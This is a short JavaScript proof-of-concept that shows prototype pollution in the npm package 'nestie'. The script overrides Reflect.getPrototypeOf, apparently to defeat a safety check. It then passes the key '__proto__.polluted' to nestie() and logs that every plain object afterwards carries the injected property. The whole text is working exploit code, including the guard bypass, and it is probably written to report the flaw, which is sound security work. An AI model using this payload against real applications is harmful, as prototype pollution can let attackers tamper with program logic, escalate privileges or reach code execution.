Reflect.getPrototypeOf = () => false;
const {nestie} = require('nestie');
obj = {};
console.log({}.polluted);
nestie({ '__proto__.polluted': 'yes' });
console.log({}.polluted);